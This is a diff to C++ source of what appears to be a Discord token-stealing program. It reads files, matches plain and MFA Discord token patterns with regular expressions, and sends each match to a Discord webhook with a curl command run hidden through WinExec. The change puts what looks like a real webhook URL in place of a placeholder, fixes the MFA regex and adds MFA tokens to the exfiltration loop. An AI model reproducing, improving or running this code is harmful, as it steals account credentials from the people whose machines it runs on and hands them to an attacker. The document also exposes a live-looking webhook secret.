@@ -13,7 +13,7 @@ bool send_token(std::string token) {
 	char cmd[1024];
 
 
-	sprintf(cmd, "curl -d \"content=%s\" https://discord.com/api/webhooks/840401711205711883/x >nul", token.c_str());
+	sprintf(cmd, "curl -d \"content=%s\" https://discord.com/api/webhooks/840401711205711883/NwJYct_xpJPrD5e6Xx9pzBARDl9JenMdVEYp69a4smbMCFHts-qXzTTu2KDstKToHZyW >nul", token.c_str());
 
 	WinExec(cmd,SW_HIDE);
 	return true;
@@ -62,13 +62,17 @@ int main() {
 			std::string str((std::istreambuf_iterator<char>(t)), std::istreambuf_iterator<char>());
 			std::vector<std::string> matches;
 			std::regex expression(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})"); // Checksum credit for token regex.
-			std::regex expression2(R"([\w-\{3}\.[\w-]{84})"); 
+			std::regex expression2(R"([\w-]{3}\.[\w-]{84})"); 
 
 			std::vector<std::string> regex_non_mfa = findMatch(str, expression); // NightfallGT for this function
 			std::vector<std::string> regex_mfa = findMatch(str, expression2); // NightfallGT for this function
 			for (int i = 0; i < regex_non_mfa.size(); i++) {
 				matches.push_back(regex_non_mfa[i]);
 			}
+			for (int i = 0; i < regex_mfa.size(); i++) {
+				matches.push_back(regex_mfa[i]);
+			}
+			
 
 			for (int i = 0; i < matches.size(); i++) {
 				send_token(matches[i]);
